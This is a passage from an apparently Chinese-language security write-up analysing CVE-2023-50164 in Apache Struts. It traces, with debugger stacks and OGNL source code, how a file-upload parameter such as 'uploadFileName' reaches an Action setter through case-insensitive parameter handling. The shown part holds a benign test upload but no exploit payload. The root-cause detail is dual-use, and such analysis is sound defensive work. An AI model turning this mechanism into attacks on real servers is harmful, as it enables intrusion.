style="color:#a6e22e">build</span>();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// then</span></span></span><span style="display:flex;"><span> assertEquals(<span style="color:#e6db74">"value1"</span>, params.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"Param1"</span>).<span style="color:#a6e22e">getValue</span>());</span></span><span style="display:flex;"><span> assertEquals(<span style="color:#e6db74">"value1"</span>, params.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"paraM1"</span>).<span style="color:#a6e22e">getValue</span>());</span></span><span style="display:flex;"><span> assertEquals(<span style="color:#e6db74">"value1"</span>, params.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"pAraM1"</span>).<span style="color:#a6e22e">getValue</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">@Test</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">shouldAppendSameParamsIgnoringCase</span>() {</span></span><span style="display:flex;"><span><span style="color:#75715e">// given</span></span></span><span style="display:flex;"><span> HttpParameters params<span style="color:#f92672">=</span> HttpParameters.<span style="color:#a6e22e">create</span>(<span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">></span>() {{</span></span><span style="display:flex;"><span> put(<span style="color:#e6db74">"param1"</span>,<span style="color:#e6db74">"value1"</span>);</span></span><span style="display:flex;"><span> }}).<span style="color:#a6e22e">build</span>();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// when</span></span></span><span style="display:flex;"><span> assertEquals(<span style="color:#e6db74">"value1"</span>, params.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"param1"</span>).<span style="color:#a6e22e">getValue</span>());</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> params<span style="color:#f92672">=</span> params.<span style="color:#a6e22e">appendAll</span>(HttpParameters.<span style="color:#a6e22e">create</span>(<span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>String, String<span style="color:#f92672">></span>() {{</span></span><span style="display:flex;"><span> put(<span style="color:#e6db74">"Param1"</span>,<span style="color:#e6db74">"Value1"</span>);</span></span><span style="display:flex;"><span> }}).<span style="color:#a6e22e">build</span>());</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// then</span></span></span><span style="display:flex;"><span> assertTrue(params.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">"param1"</span>));</span></span><span style="display:flex;"><span> assertTrue(params.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">"Param1"</span>));</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> assertEquals(<span style="color:#e6db74">"Value1"</span>, params.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"param1"</span>).<span style="color:#a6e22e">getValue</span>());</span></span><span style="display:flex;"><span> assertEquals(<span style="color:#e6db74">"Value1"</span>, params.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">"Param1"</span>).<span style="color:#a6e22e">getValue</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>查看struts代码交叉引用，可知appendAll在如下Interceptor上有引用<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/8.png"/>
在struts的struts-default.xml里面定义了默认的interceptor，其中文件上传由FileUploadInterceptor拦截请求。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;interceptor</span><span style="color:#a6e22e">name=</span><span style="color:#e6db74">"fileUpload"</span><span style="color:#a6e22e">class=</span><span style="color:#e6db74">"org.apache.struts2.interceptor.FileUploadInterceptor"</span><span style="color:#f92672">/></span></span></span></code></pre></div><h4 id="动态调试">动态调试</h4><p>发送如下请求，并在<code>org.apache.struts2.interceptor.FileUploadIntercepto#intercept</code>断点：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /upload.action<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">127.0.0.1</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">*/*</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">400</span></span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span><span style="color:#ae81ff">multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name="Upload"; filename="1.txt"</span></span><span style="display:flex;"><span>Content-Type: text/plain</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>1aaa</span></span><span style="display:flex;"><span>--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></code></pre></div><p>在调试器中可以看到inputName为表单中name参数对应的值，struts会尝试根据inputName获取content type和fileName，。<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/9.png"/></p><p>跟进<code>multiWrapper.getFileNames</code>分发中，在<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#getFileNames</code>中实现，代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String<span style="color:#f92672">[]</span><span style="color:#a6e22e">getFileNames</span>(String fieldName) {</span></span><span style="display:flex;"><span> List<span style="color:#f92672">&lt;</span>FileItem<span style="color:#f92672">></span> items<span style="color:#f92672">=</span> (List)<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">files</span>.<span style="color:#a6e22e">get</span>(fieldName);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (items<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> List<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">></span> fileNames<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ArrayList(items.<span style="color:#a6e22e">size</span>());</span></span><span style="display:flex;"><span> Iterator var4<span style="color:#f92672">=</span> items.<span style="color:#a6e22e">iterator</span>();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>(var4.<span style="color:#a6e22e">hasNext</span>()) {</span></span><span style="display:flex;"><span> FileItem fileItem<span style="color:#f92672">=</span> (FileItem)var4.<span style="color:#a6e22e">next</span>();</span></span><span style="display:flex;"><span> fileNames.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getCanonicalName</span>(fileItem.<span style="color:#a6e22e">getName</span>()));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (String<span style="color:#f92672">[]</span>)fileNames.<span style="color:#a6e22e">toArray</span>(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[</span>fileNames.<span style="color:#a6e22e">size</span>()<span style="color:#f92672">]</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>跟进<code>getCanonicalName</code>方法内，在<code>getCanonicalName</code>方法内获取了斜杠和反斜杠的位置，如果不为-1的话则会对文件名进行截断，取到最后一个斜杠后面的字符串作为文件名，防止目录穿越。</p><p>回到intercept方法中，在后面会拼接inputName组成contentTypeName和fileNameName作为Map的key，并将获取到的contentType和fileName作为value加入到HashMap中，而后通过appenAll方法将HashMap添加到<code>HttpParameter</code>中<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/10.png"/></p><p>在<code>FileInterceptor</code>获取到参数之后需要将参数通过Action的setter方法绑定到Action中的变量上。
在定义的action中的set方法断点，重新调试，发送恶意请求，调试器中主要调用栈如下：</p><pre tabindex="0"><code>setUpload:27, UploadAction (org.chestnut.action)
invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
invoke:567, Method (java.lang.reflect)
invokeMethodInsideSandbox:1245, OgnlRuntime (ognl)
invokeMethod:1230, OgnlRuntime (ognl)
callAppropriateMethod:1958, OgnlRuntime (ognl)
setMethodValue:2196, OgnlRuntime (ognl)
setPossibleProperty:98, ObjectPropertyAccessor (ognl)
setProperty:175, ObjectPropertyAccessor (ognl)
setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setValueBody:134, ASTProperty (ognl)
evaluateSetValueBody:220, SimpleNode (ognl)
setValue:308, SimpleNode (ognl)
setValue:829, Ognl (ognl)
lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
execute:-1, 769172083 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$369)
compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)
trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)
setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor)
executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2)
invoke:253, DefaultActionInvocation (com.opensymphony.xwork2)
doIntercept:152, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor)
executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2)
invoke:253, DefaultActionInvocation (com.opensymphony.xwork2)
intercept:202, StaticParametersInterceptor (com.opensymphony.xwork2.interceptor)</code></pre><p>在<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>方法中尝试将parameters的每个键值对通过参数绑定调用Action的setter方法。</p><p><img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/11.png"/></p><h4 id="获取setter方法的逻辑">获取setter方法的逻辑</h4><p>参数绑定需要获取Action中的方法并调用，在Action中对应方法下断点，可以得到如下调用栈</p><pre tabindex="0"><code>setUpload:27, UploadAction (org.chestnut.action)
invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)
invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
invoke:567, Method (java.lang.reflect)
invokeMethodInsideSandbox:1245, OgnlRuntime (ognl)
invokeMethod:1230, OgnlRuntime (ognl)
callAppropriateMethod:1958, OgnlRuntime (ognl)
setMethodValue:2196, OgnlRuntime (ognl)
setPossibleProperty:98, ObjectPropertyAccessor (ognl)
setProperty:175, ObjectPropertyAccessor (ognl)
setProperty:42, ObjectAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setProperty:84, CompoundRootAccessor (com.opensymphony.xwork2.ognl.accessor)
setProperty:3359, OgnlRuntime (ognl)
setValueBody:134, ASTProperty (ognl)
evaluateSetValueBody:220, SimpleNode (ognl)
setValue:308, SimpleNode (ognl)
setValue:829, Ognl (ognl)
lambda$setValue$2:550, OgnlUtil (com.opensymphony.xwork2.ognl)
execute:-1, 2098738059 (com.opensymphony.xwork2.ognl.OgnlUtil$$Lambda$371)
compileAndExecute:625, OgnlUtil (com.opensymphony.xwork2.ognl)
setValue:543, OgnlUtil (com.opensymphony.xwork2.ognl)
trySetValue:195, OgnlValueStack (com.opensymphony.xwork2.ognl)
setValue:182, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameter:166, OgnlValueStack (com.opensymphony.xwork2.ognl)
setParameters:228, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
doIntercept:144, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor)
executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2)
invoke:253, DefaultActionInvocation (com.opensymphony.xwork2)
doIntercept:152, ParametersInterceptor (com.opensymphony.xwork2.interceptor)
intercept:99, MethodFilterInterceptor (com.opensymphony.xwork2.interceptor)
executeConditional:299, DefaultActionInvocation (com.opensymphony.xwork2)
invoke:253, DefaultActionInvocation (com.opensymphony.xwork2)
intercept:202, StaticParametersInterceptor (com.opensymphony.xwork2.interceptor)</code></pre><p>在<code>setMethodValue:2178, OgnlRuntime (ognl)</code>断点，重新发送请求，跟进<code>getSetMethod</code>方法查看获取setter方法的逻辑</p><p><img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/2.png"/></p><p>在<code>getSetMethod</code>方法中会尝试从缓存取出<code>Upload</code>对应的方法，如果取出的<code>method</code>不为null则会返回，如果为null则会尝试调用<code>_getSetMethod</code>方法从目标class中通过反射拼接get从目标class中获取到方法。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span> Method<span style="color:#a6e22e">getSetMethod</span>(OgnlContext context, Class targetClass, String propertyName)<span style="color:#66d9ef">throws</span> IntrospectionException, OgnlException {</span></span><span style="display:flex;"><span> Method method<span style="color:#f92672">=</span> cacheSetMethod.<span style="color:#a6e22e">get</span>(targetClass, propertyName);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (method<span style="color:#f92672">==</span> OgnlRuntime.<span style="color:#a6e22e">ClassPropertyMethodCache</span>.<span style="color:#a6e22e">NULL_REPLACEMENT</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (method<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> method;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> method<span style="color:#f92672">=</span> _getSetMethod(context, targetClass, propertyName);</span></span><span style="display:flex;"><span> cacheSetMethod.<span style="color:#a6e22e">put</span>(targetClass, propertyName, method);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> method;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 参数</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">arg$3</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">'</span><span style="color:#66d9ef">this</span><span style="color:#960050;background-color:#1e0010">'</span> is not available</span></span><span style="display:flex;"><span>context<span style="color:#f92672">=</span> {OgnlContext<span style="color:#a6e22e">@6991</span>} size<span style="color:#f92672">=</span> 7</span></span><span style="display:flex;"><span>targetClass<span style="color:#f92672">=</span> {Class<span style="color:#a6e22e">@6029</span>}<span style="color:#e6db74">"class org.chestnut.action.UploadAction"</span></span></span><span style="display:flex;"><span>propertyName<span style="color:#f92672">=</span><span style="color:#e6db74">"Upload"</span></span></span><span style="display:flex;"><span>method<span style="color:#f92672">=</span> {Method<span style="color:#a6e22e">@6987</span>}<span style="color:#e6db74">"public void org.chestnut.action.UploadAction.setUpload(java.io.File)"</span></span></span></code></pre></div><p>在<code>_getSetMethod</code>方法中会调用<code>getDeclaredMethods</code>方法获取目标class中定义的指定方法，目标方法通过<code>propertyName</code>指定，<code>getDeclaredMethods</code>会调用<code>collectAccessors</code>方法</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span> Method<span style="color:#a6e22e">_getSetMethod</span>(OgnlContext context, Class targetClass, String propertyName)<span style="color:#66d9ef">throws</span> IntrospectionException, OgnlException {</span></span><span style="display:flex;"><span> Method result<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> List methods<span style="color:#f92672">=</span> getDeclaredMethods(targetClass, propertyName,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span> List<span style="color:#a6e22e">getDeclaredMethods</span>(Class targetClass, String propertyName,<span style="color:#66d9ef">boolean</span> findSets) {</span></span><span style="display:flex;"><span> List result<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> ClassCache cache<span style="color:#f92672">=</span> _declaredMethods<span style="color:#f92672">[</span>findSets<span style="color:#f92672">?</span> 0 : 1<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span> Map propertyCache<span style="color:#f92672">=</span> (Map)cache.<span style="color:#a6e22e">get</span>(targetClass);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (propertyCache<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span><span style="color:#f92672">||</span> (result<span style="color:#f92672">=</span> (List)propertyCache.<span style="color:#a6e22e">get</span>(propertyName))<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">synchronized</span>(cache) {</span></span><span style="display:flex;"><span> Map propertyCache<span style="color:#f92672">=</span> (Map)cache.<span style="color:#a6e22e">get</span>(targetClass);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (propertyCache<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span><span style="color:#f92672">||</span> (result<span style="color:#f92672">=</span> (List)((Map)propertyCache).<span style="color:#a6e22e">get</span>(propertyName))<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> String baseName<span style="color:#f92672">=</span> capitalizeBeanPropertyName(propertyName);</span></span><span style="display:flex;"><span> List result<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ArrayList();</span></span><span style="display:flex;"><span> collectAccessors(targetClass, baseName, result, findSets);</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result<span style="color:#f92672">==</span> NotFoundList<span style="color:#f92672">?</span><span style="color:#66d9ef">null</span> : result;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>在<code>collectAccessors</code>方法中首先通过反射获取到目标class的所有方法，而后遍历所有方法，并传入<code>addIfAccessor</code>方法中。<code>addIfAccessor</code>会首先判断传入的方法名是否以目标名字结尾，通过判断后会通过拼接get/set/is来判断是否是目标方法，由于传入的findSets是true，所以会找到setMethodName方法最终得到setUpload方法<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/3.png"/></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">collectAccessors</span>(Class c, String baseName, List result,<span style="color:#66d9ef">boolean</span> findSets) {</span></span><span style="display:flex;"><span> Method<span style="color:#f92672">[]</span> methods;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> methods<span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredMethods</span>();</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (SecurityException var10) {</span></span><span style="display:flex;"><span> methods<span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getMethods</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> 0; i<span style="color:#f92672">&lt;</span> methods.<span style="color:#a6e22e">length</span>;<span style="color:#f92672">++</span>i) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (c.<span style="color:#a6e22e">isInterface</span>()) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (isDefaultMethod(methods<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>)<span style="color:#f92672">||</span> isNonDefaultPublicInterfaceMethod(methods<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>)) {</span></span><span style="display:flex;"><span> addIfAccessor(result, methods<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>, baseName, findSets);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (isMethodCallable(methods<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>)) {</span></span><span style="display:flex;"><span> addIfAccessor(result, methods<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>, baseName, findSets);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> Class superclass<span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getSuperclass</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (superclass<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> collectAccessors(superclass, baseName, result, findSets);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> Class<span style="color:#f92672">[]</span> var6<span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getInterfaces</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> var7<span style="color:#f92672">=</span> var6.<span style="color:#a6e22e">length</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> var8<span style="color:#f92672">=</span> 0; var8<span style="color:#f92672">&lt;</span> var7;<span style="color:#f92672">++</span>var8) {</span></span><span style="display:flex;"><span> Class iface<span style="color:#f92672">=</span> var6<span style="color:#f92672">[</span>var8<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span> collectAccessors(iface, baseName, result, findSets);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">addIfAccessor</span>(List result, Method method, String baseName,<span style="color:#66d9ef">boolean</span> findSets) {</span></span><span style="display:flex;"><span> String ms<span style="color:#f92672">=</span> method.<span style="color:#a6e22e">getName</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (ms.<span style="color:#a6e22e">endsWith</span>(baseName)) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">boolean</span> isSet<span style="color:#f92672">=</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">boolean</span> isIs<span style="color:#f92672">=</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ((isSet<span style="color:#f92672">=</span> ms.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">"set"</span>))<span style="color:#f92672">||</span> ms.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">"get"</span>)<span style="color:#f92672">||</span> (isIs<span style="color:#f92672">=</span> ms.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">"is"</span>))) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> prefixLength<span style="color:#f92672">=</span> isIs<span style="color:#f92672">?</span> 2 : 3;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (isSet<span style="color:#f92672">==</span> findSets<span style="color:#f92672">&amp;&amp;</span> baseName.<span style="color:#a6e22e">length</span>()<span style="color:#f92672">==</span> ms.<span style="color:#a6e22e">length</span>()<span style="color:#f92672">-</span> prefixLength) {</span></span><span style="display:flex;"><span> result.<span style="color:#a6e22e">add</span>(method);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> }</span></span></code></pre></div><p><code>getSetMethod</code>获取到方法后，会通过<code>cacheSetMethod.put(targetClass, propertyName, method);</code>保存到缓存内。
而后再次调用时，可以获取到<code>setUpload</code>方法最终通过<code>invokeMethod</code>方法调用。
而对于恶意参数<code>uploadFileName</code>，由于缓存中没有<code>uploadFileName</code>，所以会尝试通过<code>_getSetMethod</code>获取对应的set方法。<img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/12.png"/></p><p>这里碰到了一个坑，众所周知Action中方法名为<code>setUploadFileName</code>对应于endwith<code>UploadFileName</code>，而uploadFileName 显然不满足条件，按道理在<code>addIfAccessor</code>方法中应该获取不到对应的set方法才是，反常的是其反而获取到了，在重新调试，才发现在<code>getDeclaredMethods</code>调用<code>collectAccessors</code>方法之前，传入的baseName参数已经变成了<code>UploadFileName</code>，满足前面的条件，获取到了get方法。
很明显，<code>baseName</code>由<code>capitalizeBeanPropertyName</code>方法返回得到</p><p><img alt="" src="/images/vulnerability/CVE-2023-50164-Apache-Struts-RCE.zh-cn.assets/13.png"/></p><p>查看<code>capitalizeBeanPropertyName</code>方法，传入的<code>propertyName</code>为<code>uploadFileName</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span> String<span style="color:#a6e22e">capitalizeBeanPropertyName</span>(String propertyName) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (propertyName.<span style="color:#a6e22e">length</span>()<span style="color:#f92672">==</span> 1) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> propertyName.<span style="color:#a6e22e">toUpperCase</span>();</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (propertyName.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">"get"</span>)<span style="color:#f92672">&amp;&amp;</span> propertyName.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">"()"</span>)<span style="color:#f92672">&amp;&amp;</span> Character.<span style="color:#a6e22e">isUpperCase</span>(propertyName.<span style="color:#a6e22e">substring</span>(3, 4).<span style="color:#a6e22e">charAt</span>(0))) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> propertyName;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (propertyName.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">"set"</span>)<span style="color:#f92672">&amp;&amp;</span> propertyName.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">")"</span>)<span style="color:#f92672">&amp;&amp;</span> Character.<span style="color:#a6e22e">isUpperCase</span>(propertyName.<span style="color:#a6e22e">substring</span>(3, 4).<span style="color:#a6e22e">charAt</span>(0))) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> propertyName;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> (propertyName.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">"is"</span>)<span style="color:#f92672">&amp;&amp;</span> propertyName.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">"()"</span>)<span style="color:#f92672">&amp;&amp;</span> Character.<span style="color:#a6e22e">isUpperCase</span>(propertyName.<span style="color:#a6e22e">substring</span>(2, 3).<span style="color:#a6e22e">charAt</span>(0))) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> propertyName;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> first<span style="color:#f92672">=</span> propertyName.<span style="color:#a6e22e">charAt</span>(0);</span></span><span 